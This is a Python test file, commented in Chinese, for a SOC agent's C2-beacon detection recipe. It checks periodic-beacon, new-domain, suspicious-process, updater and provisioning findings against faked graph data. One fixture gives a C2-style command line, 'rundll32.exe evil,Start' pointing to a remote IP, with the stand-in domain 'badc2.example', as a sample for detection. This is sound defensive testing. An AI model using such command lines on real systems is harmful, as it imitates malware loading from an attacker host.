"""c2_beacon 迁移(旧 dict → 结构化 Forensics)的 finding 抽取测试。

★核心方法论:周期性单独绝不 TP —— 三信号(周期性/新域/可疑进程)各自独立成 finding,
recipe 只观察不下结论,组合成结论交第二类经验/DSL(qwen 学)。这里断言各信号是否按预期独立点亮。
"""
from pathlib import Path

from soc_agent.forensics import Forensics
from soc_agent.models import Alert
from soc_agent.skills_runtime import SkillRegistry

_SKILLS = Path(__file__).resolve().parents[1] / "skills"


class FakeGraph:
    """按 Cypher 子串返回预置行(子串须在各查询里唯一,解耦调用顺序)。"""

    def __init__(self, table):
        self.table = table                       # list[(substr, rows)]

    def run_cypher(self, query, **params):
        for substr, rows in self.table:
            if substr in query:
                return rows
        return []


def _c2():
    return SkillRegistry(_SKILLS).by_name("c2_beacon").recipe


def pivot_process(guid, hostname=None):
    """`resolve_pivot` 的预置行:主语 = Process(GOAD/Sysmon 今天的形状)。

    ★WP7 起 recipe **先解析主语再取证**,所以 fixture 必须把"这条告警的主语是谁"说清楚。
    不给的话 recipe 会产出 `_coverage.absent` —— 这正是它该有的行为(见 test_pivot.py)。
    """
    return ("labels(subj) AS subj_labels",
            [{"subj_labels": ["Process"], "subj": {"process_guid": guid},
              "src_labels": None, "src": None, "hostname": hostname}])


def test_c2_attack_periodic_newdomain_suspproc_emit_red():
    # C2 态:非浏览器进程(rundll32,可疑父链 powershell)高周期外连到近期新域 → 三红信号叠加
    graph = FakeGraph([
        pivot_process("p-1", "WIN10"),
        ("AS dst_domain", [{"proc_guid": "p-1", "image": r"C:\Windows\Temp\rundll32.exe",
                            "command_line": "rundll32.exe evil,Start http://45.77.10.10/", "dst_port": 443,
                            "dst_ip": "45.77.10.10", "dst_domain": "badc2.example", "host": "WIN10"}]),
        ("CONNECTED_TO]->(:IPAddress {ip:$ip})", [{"count": 180, "first_seen": "2026-07-15T00:00:00",
                                                   "last_seen": "2026-07-15T06:00:00"}]),
        ("QUERIED]->(:Domain {fqdn:$f})", []),                       # 非 DNS 信道
        ("AS domain_first_seen", [{"domain_first_seen": "2026-07-14"}]),  # 昨日首见 = 新域
        ("parent.image AS parent", [{"parent": "powershell.exe", "account": "admin"}]),
    ])
    a = Alert.from_node({"alert_uid": "c1", "technique_ids": ["T1071.001"], "time": "2026-07-15"})
    fo = _c2()(graph, a, {})
    assert isinstance(fo, Forensics)
    ids = fo.finding_ids()
    assert {"c2.periodic_beacon", "c2.new_domain", "c2.suspicious_process"} <= ids
    assert "c2.known_updater" not in ids
    assert "c2.provisioning_noise" not in ids       # 命令行无 ansible/自检噪声

    pb = next(f for f in fo.findings if f.finding_id == "c2.periodic_beacon")
    assert pb.polarity == "red" and pb.attrs["count_bucket"] == "massive" and pb.attrs["channel"] == "http"

    sp = next(f for f in fo.findings if f.finding_id == "c2.suspicious_process")
    assert sp.polarity == "red"
    assert "rundll32.exe" in sp.attrs["image"]       # image 原值进 attrs = 可移植承重 key
    assert sp.attrs["suspicious_parent"] is True     # powershell 父链

    nd = next(f for f in fo.findings if f.finding_id == "c2.new_domain")
    assert nd.polarity == "red"

    # bindings:进程 image 原值保留;身份角色(ip/域/主机)登记供指纹抽象
    assert fo.bindings["process"] == r"C:\Windows\Temp\rundll32.exe"
    assert fo.bindings["ip"] == "45.77.10.10"
    assert fo.bindings["domain"] == "badc2.example"
    assert fo.bindings["host"] == "WIN10"
    assert fo.context.get("进程与目标")               # prose 仍在(喂 LLM)


def test_c2_benign_known_updater_old_domain_no_suspproc():
    # 良性态:已知更新器(GoogleUpdate)低频外连到老域 → known_updater 白;suspicious_process/new_domain 不触发
    graph = FakeGraph([
        pivot_process("p-2", "WKS01"),
        ("AS dst_domain", [{"proc_guid": "p-2",
                            "image": r"C:\Program Files\Google\Update\GoogleUpdate.exe",
                            "command_line": "GoogleUpdate.exe /svc", "dst_port": 443,
                            "dst_ip": "142.250.0.1", "dst_domain": "update.googleapis.com", "host": "WKS01"}]),
        ("CONNECTED_TO]->(:IPAddress {ip:$ip})", [{"count": 3, "first_seen": "2026-07-01",
                                                   "last_seen": "2026-07-15"}]),
        ("QUERIED]->(:Domain {fqdn:$f})", []),
        ("AS domain_first_seen", [{"domain_first_seen": "2025-01-01"}]),  # 一年半前 = 老域
        ("parent.image AS parent", [{"parent": "services.exe", "account": "user"}]),
    ])
    a = Alert.from_node({"alert_uid": "c2", "technique_ids": ["T1071.001"], "time": "2026-07-15"})
    fo = _c2()(graph, a, {})
    ids = fo.finding_ids()
    assert "c2.known_updater" in ids
    assert "c2.suspicious_process" not in ids         # 已知更新器 → 不误判可疑进程
    assert "c2.new_domain" not in ids                 # 老域

    ku = next(f for f in fo.findings if f.finding_id == "c2.known_updater")
    assert ku.polarity == "white"
    assert "GoogleUpdate.exe" in ku.attrs["image"]     # image 原值承重

    pb = next(f for f in fo.findings if f.finding_id == "c2.periodic_beacon")
    assert pb.polarity == "neutral" and pb.attrs["count_bucket"] == "low"   # 低频周期 = 不单独定性

    assert fo.bindings["process"] == r"C:\Program Files\Google\Update\GoogleUpdate.exe"


def test_c2_provisioning_noise_emits_white():
    # Ansible 配管供给经 powershell 外连 → provisioning_noise 白(已知良性,证伪)
    graph = FakeGraph([
        pivot_process("p-3", "SRV02"),
        ("AS dst_domain", [{"proc_guid": "p-3",
                            "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "command_line": "powershell.exe -c Write-AnsibleLog 'provision'", "dst_port": 8080,
                            "dst_ip": "10.0.0.5", "dst_domain": None, "host": "SRV02"}]),
        ("CONNECTED_TO]->(:IPAddress {ip:$ip})", [{"count": 2, "first_seen": "2026-07-15T00:00:00",
                                                   "last_seen": "2026-07-15T00:10:00"}]),
        ("parent.image AS parent", [{"parent": "ansible-runner", "account": "svc"}]),
    ])
    a = Alert.from_node({"alert_uid": "c3", "technique_ids": ["T1071.001"], "time": "2026-07-15"})
    fo = _c2()(graph, a, {})
    ids = fo.finding_ids()
    assert "c2.provisioning_noise" in ids
    pn = next(f for f in fo.findings if f.finding_id == "c2.provisioning_noise")
    assert pn.polarity == "white" and "ansible" in pn.attrs["label"].lower()
    assert "c2.new_domain" not in ids                 # 无目标域 → 无新鲜度判定
